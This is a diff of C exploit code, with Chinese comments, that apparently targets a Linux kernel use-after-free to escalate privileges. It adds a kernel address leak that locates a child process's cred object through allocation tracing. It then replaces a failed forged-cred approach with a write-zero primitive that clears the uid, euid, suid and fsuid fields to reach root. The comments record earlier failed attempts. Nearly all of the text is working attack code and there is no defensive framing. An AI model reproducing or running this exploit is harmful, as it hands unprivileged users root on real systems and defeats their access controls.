@@ -2012,6 +2012,7 @@ static int leak_task(void)
 	int nsizes = 0, nsites = 0;
 	uint64_t max_alloc = 0, max_site = 0;
 	int have_site = 0;
+	int have_cred = 0, cred_hits = 0;
 
 	if (pipe(g_wake) || pipe(g_report))
 		return -1;
@@ -2097,6 +2098,22 @@ static int leak_task(void)
 			}
 			if (!match)
 				continue;
+			/* 2.0.34：cred_child 的 cred 对象捕获。fork 的 copy_creds 在
+			 * 本窗口（arming 后紧跟 fork）从 cred_jar 分配；BTF 实测
+			 * object_size=176、HWCACHE_ALIGN 后 bytes_alloc=192。
+			 * req==176 可与通用 kmalloc-192（req==alloc==192）区分。
+			 * cred 分配是窗口内首个 cred 尺寸事件，取首条。 */
+			if (req == 176 && (alloc == 184 || alloc == 192)) {
+				if (!have_cred) {
+					g_cred_kva = ptr;
+					have_cred = 1;
+				}
+				cred_hits++;
+				dprintf(STDOUT_FILENO,
+					"[cred-leak] candidate=%d ptr=%#" PRIx64
+					" req=%" PRIu64 " alloc=%" PRIu64 "\n",
+					cred_hits, ptr, req, alloc);
+			}
 			/* call_site 命中是确定性的，优先级高于尺寸窗口；
 			 * 一旦拿到 site 命中，就不再让尺寸兜底覆盖它。 */
 			if (match == 1) {
@@ -2123,6 +2140,9 @@ static int leak_task(void)
 		hits, by_site, by_size, foreign, other, g_task, scanned, ncpu,
 		TASK_STRUCT_SIZE, TASK_STRUCT_SIZE + TASK_VENDOR_EXTRA_MAX, want_site,
 		max_alloc, max_site);
+	dprintf(STDOUT_FILENO,
+		"[cred-leak] cred=%#" PRIx64 " candidates=%d\n",
+		have_cred ? g_cred_kva : 0, cred_hits);
 	if (!hits) {
 		/* One run must be enough to tell the three failure modes apart:
 		 * no records at all -> event never enabled; records but none of
@@ -2267,37 +2287,48 @@ int uaf_plant_main(int argc, char **argv)
 				read_enforce();
 		}
 	}
-	g_plant_cred = 1;
+	/*
+	 * 2.0.34：放弃"伪造 cred 挂载"路径（第 10-12 次实测证明内核从未消费
+	 * cred 节点，且任何重定向机制都无法在本内核触发）。改用已每轮实证的
+	 * 写零原语（selinux 瓦片 node[2]=目标 / node[0]=0 → 内核往目标写零），
+	 * 直接清零 cred_child 真实 cred 对象的 uid 字段组：
+	 *   +4 (uid,gid)  +12 (euid,egid)  +20 (suid,sgid)  +28 (fsuid,fsgid)
+	 * cred 对象地址由 leak_task 从 fork 窗口的 trace 捕获（cred_jar,
+	 * req=176/alloc=192，BTF 实测）。usage@0 不触碰，对象保持有效。
+	 * 写目标是活对象的非指针字段，即使目标抓错也不会踩野指针。
+	 */
 	int rooted = 0;
+	const int cred_field_off[4] = { 4, 12, 20, 28 };
+	const char *cred_field_name[4] = { "uid/gid", "euid/egid", "suid/sgid", "fsuid/fsgid" };
 	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
 		unsigned uid = 1, euid = 1;
-		int fixed_uid = -1, fixed_suid = -1;
-		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
-		g_plant_cred = 1;
-		if (one_uaf(0))
-			continue;
-		g_plant_cred = 0;
-		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
+		dprintf(STDOUT_FILENO, "[cred] clear attempt %d/12 cred=%#" PRIx64 "\n",
+			attempt, g_cred_kva);
+		if (!g_cred_kva) {
+			dprintf(STDOUT_FILENO, "[cred] no cred object leaked, abort\n");
+			break;
+		}
+		int all_ok = 1;
+		for (int k = 0; k < 4; k++) {
+			dprintf(STDOUT_FILENO, "[cred] zero %s @ %#" PRIx64 "\n",
+				cred_field_name[k], g_cred_kva + cred_field_off[k]);
+			if (one_uaf(g_cred_kva + cred_field_off[k])) {
+				all_ok = 0;
+				break;
+			}
+		}
 		log_sync();
 		log_proc_uid(g_cred_child_pid);
-		/*
-		 * 2.0.31：第 10 次实测 installed 首次达成，但 cred_child 恒 uid=2000。
-		 * 重定向目标是 g_task（注入进程）的 cred 槽——成功时应变 root 的是
-		 * 本进程而非 cred_child。双路验证：自读 getuid()，任一路径为 0 即 rooted。
-		 */
-		dprintf(STDOUT_FILENO, "[cred] self uid=%d euid=%d\n",
-			(int)getuid(), (int)geteuid());
-		if (getuid() == 0 && geteuid() == 0)
+		if (!all_ok) {
+			dprintf(STDOUT_FILENO, "[cred] field clear incomplete, retry\n");
+			continue;
+		}
+		dprintf(STDOUT_FILENO, "[cred] fields cleared, verifying\n");
+		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
 			rooted = 1;
-		for (int i = 0; i < 3 && fixed_uid; i++)
-			fixed_uid = one_uaf(g_cred_kva + 8);
-		for (int i = 0; i < 3 && fixed_suid; i++)
-			fixed_suid = one_uaf(g_cred_kva + 16);
-		if (!rooted && ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
-			rooted = 1;
-		else if (!rooted && uid == 1 && euid == 1)
+		else if (uid == 1 && euid == 1)
 			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
-		else if (!rooted)
+		else
 			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
 	}
 	if (!rooted) {
